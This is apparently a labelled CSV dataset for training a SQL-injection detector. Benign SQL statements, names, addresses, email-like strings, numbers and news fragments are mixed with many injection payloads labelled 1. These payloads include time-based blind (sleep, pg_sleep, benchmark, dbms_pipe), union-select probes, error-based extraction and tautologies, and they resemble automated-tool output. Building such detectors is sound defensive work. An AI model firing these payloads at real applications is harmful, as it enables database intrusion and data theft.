Sentence,Label
"  SELECT colorID AS ID, identity AS hay FROM date",0
"-9737""  )  )   )  order by 1--",1
SELECT garage ( s )  FROM inside SELECT research FROM secret,0
SELECT * FROM rocket WHERE pool = 'would' LIMIT 3,0
7751,0
karkotsk,0
"1'  )  )   )  and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (   ( 'zovb' like 'zovb",1
contrariosa,0
"1""  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
23790,0
"  SELECT INSERT ( ""W3Schools.com"", 1, 9, ""Example"" ) ;",0
 I follow facts wherever lead ,0
SELECT * FROM traffic  WHERE deal NOT LIKE '[over]%',0
"-5825 )  as mflf where 3999 = 3999 or make_set ( 1492 = 7153,7153 ) --",1
 In August year two breakdowns single week ,0
"1%""  )  )   and sleep ( 5 )  and   (  (  ""%"" = """,1
"1"" and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ",1
FROM  ( SELECT DISTINCT band FROM page ) ,0
"1%"" or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and ""%"" = """,1
"-7379 union all select 9813,9813,9813,9813,9813,9813,9813,9813--",1
"1' where 8749 = 8749 or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
postranecky@francislucille.mm,0
"1""  )   as ucex where 5148  =  5148 order by 1#",1
"1"" )  where 9962 = 9962 and 4595 = 4595#",1
"1'  )  )   and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (  'bzak' like 'bzak",1
SELECT father ( s FROM when RIGHT JOIN,0
baguda sabarich,0
" UBS said week taken action employees Swiss regulator , Finma , said investigating suspected manipulation foreign exchange market number Swiss banks ",0
mol,0
"1'+ ( select nvht where 9118 = 9118 or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  )  +'",1
griffy,0
 This announced Ulrich Knobel organising Illmensee Sports Club ,0
05198,0
"   SELECT nature,another,bicycle,specific,cheese     (  (  not JOIN citizen ON thumb.sell =  has.establish )   INNER JOIN reasonON Orders.hand =  quiet.mouseID ) ",0
"1 )  as hywx where 1424 = 1424 and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
select case when 4176 = 6138 then 1 else null end--,1
"1 )  where 7881 = 7881 and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
SELECT * FROM shaking WHERE period = 'met'  OR field = 'smoke',0
7806339136091099,0
SELECT * FROM sit ORDER BY game,0
9004540000000000,0
SELECT * FROM safety FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM powerful,0
alcolea del pinar,0
" Numerous dependency parsing algorithms proposed natural language processing community, including transition-based graph-based dependency parsing",0
quill,0
"  SELECT SUBTIME ( ""10:24:21"", ""300"" ) ;",0
SELECT Count ( * )  AS practice,0
if  (  8284  =  6171  )   select 8284 else drop function mbih--,1
"-2006'  )  )   union all select 7852,7852,7852,7852,7852--",1
'  ( select top 1,1
"  SELECT fullID AS ID, whether AS exercise FROM speech",0
SELECT drive ( s FROM laid RIGHT JOIN,0
1631,0
5418160000000000,0
enga3ladu4a,0
SELECT AVG ( public ) FROM gasoline,0
9453890495561533,0
475t38la,0
 end# thjv,1
missy,0
"select * from generate_series  (  2317,2317,case when   (  2317  =  9706  )   then 1 else 0 end  )   limit 1--",1
04212893y,0
" Women &apos;t sexy professionals anymore; also sexy foods like pizza , hamburgers carrots ",0
" select * from users where id  =  1 or 1#""; union select version  (    )  ,version  (    )   -- 1",1
sims2@videocasa-ebs.ru,0
1'   )    )    as dckd where 1794  =  1794,1
1' and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #,1
22991,0
7647480000000000,0
SELECT * FROM creature WHERE game = 'hurried'  OR camp = 'rapidly',0
1%'  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1
"-9347'  )   union all select 3884,3884#",1
SELECT * FROM drink WHERE deeply LIKE '%metal%',0
"1"" )  where 6964 = 6964",1
1 where 2672 = 2672 and 1819 = 4322#,1
"1'   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'lwyo'  =  'lwyo",1
SELECT * FROM making WHERE him  BETWEEN 10 AND 20,0
"1  )  )   union all select null,null,null--",1
"-4093'  )  )   union all select 5785,5785,5785#",1
surai,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 3946 )  ORDER BY meta_id ASC",0
yu-chian,0
"""  )   or sleep  (  __TIME__  )    =  """,1
keene3@irmedia.gm,0
"1 and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ",1
hardyck,0
'hi' or 'x' = 'x';,1
72588518n,0
SELECT rhythm ( s FROM carried RIGHT JOIN,0
" ( select * from  ( select ( sleep ( 5  )  )   ) srmq )  and   (  (  ""%"" = """,1
cap!tar,0
coralie,0
"1"" )  as pwvu where 8267 = 8267",1
DELETE FROM beauty,0
"-9439""  )   where 9460  =  9460 or   (  9497  =  9586  )  *9586--",1
-7600' or 7684 = 3181#,1
" Even though earns S $ 3,000 ($ 2,400) month administrator husband works well , monthly family income insufficient , says ",0
gumersindo,0
SELECT * FROM born FETCH FIRST 50 PERCENT ROWS ONLY,0
" Thus far , researchers know neither physical laws applied initial moments Big Bang , dark matter dark energy consist ",0
1 rlike sleep  (  5  )  #,1
SELECT * FROM adjective WHERE Price NOT BETWEEN 10 AND 20,0
1 where 3502 = 3502 order by 1--,1
"1"" )  as rbgl where 3822 = 3822 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 ) --",1
"  SELECT * FROM heard WHERE above NOT IN  ( 'add', 'native', 'writing' )  ",0
" The earnest solemnity storytelling risks making hair shirt-like ordeal audiences , ",0
herbers,0
SELECT * FROM practice  WHERE pipe = certainly,0
 Trainer Tomasz Malmon let doubt fact ,0
"1'  )   where 2284  =  2284 and make_set  (  8403  =  8403,8899  )  --",1
"1' )  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users ) ",1
"1%""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1
catalda,0
"   SELECT bottom, leave, tasteFROM coming WHERE life  IS NOT NULL",0
1  )  )   as skex where 7941 = 7941 and sleep ( 5 ) --,1
"c/ ancha, 31 5a",0
zalee,0
holtz@pasajesaereosbaratos.es,0
"  SELECT SUBSTRING_INDEX ( ""www.w3schools.com"", ""."", 2 ) ;",0
SELECT * FROM tried WHERE women = 'bag'  OR play = 'jack',0
SELECT jump FROM mark UNION SELECT corner FROM coal ORDER BY over,0
"1'+  (  select jqyo where 4426  =  4426 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",1
"1""  )   as axua where 6718  =  6718",1
SELECT rock FROM carbon UNION SELECT oil FROM home ORDER BY independent,0
" select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",1
berber,0
shazmin,0
"1"" where 3764  =  3764",1
7825,0
6rce8o,0
SELECT our ( s )  FROM square UNION ALL,0
 She move muscle rescue - frozen solid ,0
kelcy,0
"  SELECT SUBSTRING ( ""SQL Tutorial"", -5, 5 )  AS ExtractString;",0
"-2102' where 3644  =  3644 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
"1, ( select  ( case when  ( 9443 = 9443 )  then sleep ( 5 )  else 9443* ( select 9443 from information_schema.character_sets )  end  )  )  ",1
wever ribot,0
42223,0
1'+ ( select enzd where 6046 = 6046 and  ( 3020 = 3020 ) *6703 ) +',1
"1'  )   as dvoy where 7906  =  7906 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
"1'+  (  select 'qzcx' where 9524  =  9524 and elt  (  3069  =  8430,8430   )    )   +'",1
SELECT * FROM pull FETCH FIRST 50 PERCENT ROWS ONLY,0
select   (  case when   (  6166  =  3364  )   then 6166 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
SELECT * FROM putting FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM human,0
"1%"" or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
SELECT camera ( s )  FROM principle,0
1  )   as fhvb where 4008  =  4008,1
18269491q,0
SELECT wp_posts.* FROM wp_posts WHERE 1 = 1 AND wp_posts.post_name IN  ( 'our-family-template' )  AND  (  0  =  1  )  AND wp_posts.post_type  =  'wp_template' AND   (  (  wp_posts.post_status  =  'publish'  )  )   GROUP BY wp_posts.ID ORDER BY wp_posts.post_date DESC,0
en2re7e4hu16,0
SELECT * FROM bright FETCH FIRST 3 ROWS ONLY,0
"1%'  )  )   )  or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
SELECT yes FROM regular,0
4126500000000000,0
"1%""  )  )   )  or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (   ( ""%"" = """,1
SELECT * FROM close WHERE found = 'pool' LIMIT 3,0
" For medical nursing students O &apos;Malley , come United States Europe join Bwelle missions , &apos;s hands-on opportunity &apos;d never get home ",0
"  SELECT dropID AS ID, four AS importance FROM low",0
"1""  )   as pgza where 8756  =  8756 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
1   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  3332  =  3332,1
5215,0
"1""   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  ""tabq"" like ""tabq",1
"1, ( select  ( case when  ( 5726 = 5275 )  then 1 else 1/ ( select 0 )  end  )  )  ",1
62349457e,0
1'  )  )   )  rlike  ( select  ( case when  ( 5524 = 9582 )  then 1 else 0x28 end  )  )   and   (  (   ( 'okoj' like 'okoj,1
1'+  (  select gguu where 7809  =  7809 union all select null--,1
"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy",1
l1brad80o,0
"1%'   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
fol0ado,0
alarico,0
66,0
11804986y,0
08693,0
" select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",1
1'+ ( select wgmn where 4368 = 4368 and 7859 = 6151 ) +',1
"campa zabala 184,",0
" Should election decided two months stopped voting ? &quot; We need better system , &quot; said ",0
carol,0
"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""krxy""  =  ""krxy",1
"1"" and make_set ( 8403 = 8403,8899 )  and ""bbgg"" = ""bbgg",1
"1%""  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  ""%""  =  """,1
"1%""  )  )   and 7358 = 6986--",1
1'|| ( select 'vxfx' where 7038 = 7038 and 9306 = 4187 ) ||',1
05122,0
SELECT * FROM bag WHERE should = 'bar'  OR lower = 'difference',0
1%'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  '%'  =  ',1
"-5744  )   union all select 3617,3617,3617,3617,3617,3617--",1
pardos@barcafedaniss.co,0
SELECT * FROM final  WHERE salmon NOT LIKE '[ship]%',0
1581120000000000,0
"1'  )  )   )  union all select null,null,null,null,null,null,null,null--",1
SELECT TOP 50 PERCENT * FROM our,0
SELECT * FROM exist FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM press,0
pomeroy5,0
valdovio,0
SELECT paragraph FROM carry,0
SELECT AVG ( camera )  FROM apart  SELECT SUM ( thick ) ,0
SELECT sell ( s )  FROM sunlight SELECT done FROM picture,0
"  SELECT TO_DAYS ( ""2017-06-20 09:34:00"" ) ;",0
"-8065""   )    )     )   order by 1--",1
-8023' or 6872 = 6872,1
1' and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,1
"  SELECT DAYNAME ( ""2017-06-15"" ) ;",0
spears,0
"  SELECT Orders.obtainrID, Employees.curious, Employees.nodded FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.dieID ORDER BY Orders.sickID",0
"1' where 7080  =  7080 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"1"" or sleep ( 5 ) ",1
regidor fa,0
vertavillo,0
"-5581%'   )    )     )   union all select 4266,4266,4266,4266,4266,4266,4266,4266,4266,4266#",1
"-9315'   )    )     )   union all select 5057,5057,5057,5057,5057#",1
otmar,0
"1'   )    )    as tgso where 1349  =  1349 union all select null,null,null,null--",1
"1' )  where 6387 = 6387 and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
SELECT measure ( s )  FROM yard UNION,0
" And I &apos;m going Europe make clear need continue work together combatting terrorism , notwithstanding anger NSA programs ",0
SELECT TOP 3 * FROM pig WHERE slow = 'cry',0
1'+  (  select qsmo where 3172  =  3172,1
" SELECT * FROM took ORDER BY everything ASC, dinner DESC",0
whipple,0
"1'||  (  select 'kgfu' from dual where 2607  =  2607 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"-9318""   )    )     )   union all select 5223,5223,5223,5223#",1
hargrow2,0
bringu mulleras,0
"1%""   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  ""%""  =  """,1
13g0e7at42a,0
boget brufau,0
calle matias ramon martinez martinez 30,0
2214198462446690,0
8120300504791286,0
16535,0
1'  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'svhx'  =  'svhx,1
" He cumbers never consequences, interests: gives independent, genuine verdict",0
SELECT below ( s )  FROM station SELECT thank FROM knowledge,0
SELECT * FROM climate WHERE done = 'boat' FETCH FIRST 3 ROWS ONLY,0
selles tanari,0
ramaprak,0
"1'+ ( select 'epza' where 8994 = 8994 and make_set ( 3782 = 2428,2428  )  )  +'",1
7680000000000000,0
henson_shah@eco-pro.cx,0
8889874100386477,0
SELECT COUNT ( possibly ) FROM roll,0
"1%"" )  and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and  ( ""%"" = """,1
"1' and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1
karola5,0
40529,0
lvega,0
1'  )  )   rlike sleep ( 5 )  and   (  (  'qitl' like 'qitl,1
05200,0
SELECT * FROM length WHERE flow = 'review' FETCH FIRST 3 ROWS ONLY,0
56632037b,0
7750000000000000,0
jiyuan,0
urbanowi,0
alvin@arroyo-molinos.sl,0
7367769822480051,0
SELECT * FROM ocean,0
SELECT * FROM news WHERE gently NOT LIKE '[paper]%',0
SELECT TOP 50 PERCENT * FROM locate SELECT * FROM death FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM greater,0
"1'||  (  select 'mjkz' where 9430  =  9430   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users   )    )   ||'",1
&',1
constante,0
select  ( case when  ( 4780 = 4432 )  then 4780 else 4780* ( select 4780 from mysql.db )  end ) #,1
"-8810'  )   or make_set  (  9354  =  9354,7185  )   and   (  'prsn' like 'prsn",1
loamiento,0
matzenauer@evelin.com.ci,0
SELECT TOP 50 PERCENT * FROM thy,0
"1""  )   as ltoa where 9159  =  9159 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
2er7n9um43a,0
"1""  )  )   and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (  ""vjvz"" like ""vjvz",1
arima@hormigon-impreso.nu,0
SELECT MIN ( weight )  AS market FROM zulu,0
  )  )   or sleep ( __TIME__ )  = ',1
mitune@necesitouncredito.sl,0
2409731978356224,0
"1%""  )  )   )  or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
5828720454408977,0
SELECT * FROM case FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM number,0
SELECT * FROM shallow WHERE wheel BETWEEN '1996-07-01' AND '1996-07-31',0
"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kird'  =  'kird",1
"1"" and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and ""vzud"" like ""vzud",1
"1%'  )  )   and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"1'  )  )   or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and   (  (  'stqq' = 'stqq",1
" She daughter former Australian league player Peter Tunks , appealed Department Foreign Affairs Canberra assist daughter ",0
-9191' )  as qtvm where 2838 = 2838 or  ( 8459 = 8459 ) *4906--,1
"sayago, 156,",0
cristy,0
1%'   )    )    and 7989  =  3457,1
"1 )  and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and  ( 8929 = 8929",1
SELECT COUNT ( chamber ) FROM managed,0
7009,0
calle torreta 126 9c,0
minera dauns,0
"-8021""  )   union all select 1166,1166,1166,1166--",1
berky,0
torterolo buix,0
1 or sleep ( 5 ) #,1
rubau,0
SELECT naturally ( s )  FROM history UNION,0
SELECT * FROM course 3 SELECT * FROM press,0
SELECT TOP 3 * FROM saddle SELECT * FROM grow 3SELECT * FROM century,0
e72i4,0
a8errad1r,0
1'|| ( select 'lnhq' where 7526 = 7526,1
"1"" )  as pxdq where 2236 = 2236 and 2006 = 2006",1
-3921'  )   as audo where 7087  =  7087 or 1755  =  4937--,1
cortie,0
"  SELECT touch,distant,gun FROM into LEFT JOIN Orders ON hardly.termID =  apart.view ORDER BY forward.discussion",0
"1  )  )   or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and   (  (  8294 = 8294",1
"-1401""  )  )   union all select 3480,3480,3480,3480,3480,3480--",1
sogorb ipamo,0
villena,0
saleh,0
SELECT AVG ( Price ) FROM income,0
walker,0
"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf",1
comprensin,0
"  SELECT * FROM five WHERE dirty IN  ( 'village', 'plane', 'industry' )  ",0
""" """,1
rossenberck,0
SELECT * FROM wp_posts WHERE ID  =  28620 LIMIT 1,0
"1' )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and  ( 'iixp' = 'iixp",1
"1  )  )   or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1
 select * from users where id = 1 + $+%1 or 1 = 1 -- 1,1
"-8773%'  )  )   )  union all select 8941,8941,8941,8941,8941,8941#",1
"-9384%"" union all select 7031,7031,7031,7031,7031,7031,7031,7031,7031#",1
"1 )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ",1
ocelot,0
1'  )   or sleep  (  5  )   and   (  'fizk'  =  'fizk,1
" select * from users where id  =  1 or ""\#"" or 1  =  1 -- 1",1
" Federal Health Minister Tanya Plibersek announced Commonwealth taking &quot; urgent action &quot; head crisis caused island state &apos;s aging population , higher rates chronic disease system constraints ",0
DELETE FROM thought WHERE black = 'declared',0
SELECT * FROM  ( SELECT service FROM bet ) ,0
SELECT * FROM art ORDER BY perfectly,0
ninno,0
"calle practicante calixto rodriguez 163,",0
staton,0
"-3415 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) -- jove",1
SELECT COUNT ( DISTINCT sport )  FROM full,0
SELECT bridge ( s )  FROM able SELECT thing ( s ) ,0
2 billion dollars $ 6,0
 or  ( EXISTS ) ,1
SELECT * FROM now WHERE process = 'treated' LIMIT 3,0
"1""   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""atlz""  =  ""atlz",1
SELECT * FROM every FETCH FIRST 3 ROWS ONLY,0
1'   )    )    as eymg where 7000  =  7000,1
15553,0
SELECT fear ( s )  FROM dead,0
SELECT TOP 50 PERCENT * FROM act,0
SELECT AVG ( aware ) FROM ship,0
waller,0
SELECT MIN ( list )  AS enjoy FROM happened,0
SELECT * FROM one  WHERE threw = step,0
" select * from users where id = 1 or 1#"", union select null,version (  )  -- 1",1
4780720000000001,0
de cabezn raizbal,0
"-1184""   )    )     )   union all select 1482--",1
-2679'  )  )   )  or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (   ( 'cutk' like 'cutk,1
prevost_toby@ballobar.com.ad,0
1'  )  )   rlike sleep ( 5 )  and   (  (  'iwct' = 'iwct,1
"1' )  and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( 'zspf' = 'zspf",1
SELECT TOP 50 PERCENT * FROM fallen,0
nowack@softwaresaas.bm,0
"1   )    )    as fynx where 9636  =  9636 union all select null,null,null,null,null--",1
5048106105397665,0
"1'   )    )    as hfra where 6500  =  6500 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1  )   where 7425  =  7425 union all select null,null,null,null,null,null,null,null,null,null--",1
"-6292  )   union all select 7499,7499,7499,7499,7499,7499,7499--",1
" Areane Blersch Binzwangen took second place , ahead Natascha Werner Stuttgart ",0
c/ pirucha s/n 4-e,0
"1%""  )  )   rlike sleep ( 5 ) #",1
84166910c,0
" Infancy conforms nobody: conform it, one babe commonly makes four five adults prattle play it",0
 &quot; Perry said dinner veteran rocker &quot; hit I 18 ,0
SELECT MIN ( compound )  AS underline FROM crowd,0
94318165h,0
" &quot; I opinion sufficient basis exists &quot; formal investigation , said ",0
8288600000000001,0
jorey@20horas.ao,0
12449,0
"calle 300 al 8 del km. 1 puesta en riego 144,",0
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'mcrt'  =  'mcrt,1
 &quot; They comers two walked gold cup rosette ,0
"san antonio, 105, 9-d",0
"1 )  as caoa where 6139 = 6139 union all select null,null,null,null,null,null,null,null--",1
SELECT * FROM slowly ORDER BY remove DESC,0
"calle goletera 30, 6a",0
SELECT MIN ( separate )  AS pine FROM dig,0
" For 14 hours , doctors battled save life victim , ultimately vain ",0
"-3126  )  )   union all select 6718,6718,6718,6718,6718--",1
4935554028654452,0
"   SELECT COUNT ( pond ) , sale FROM mission BY atmosphere",0
81717068t,0
brigida,0
"1' )  and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
 He said European leaders need honest people kind espionage programs &apos;ve used years ,0
"-9764' where 1266 = 1266 or elt ( 4069 = 6162,6162 ) --",1
"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""egzm""  =  ""egzm",1
" select * from users where id = 1 union select 1<@,version (  )  -- 1",1
pente@maxitienda.ms,0
tromen,0
"1%'   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  '%'  =  '",1
"1%""   )    )     )   and make_set  (  8191  =  7813,7813  )   and    (    (     (  ""%""  =  """,1
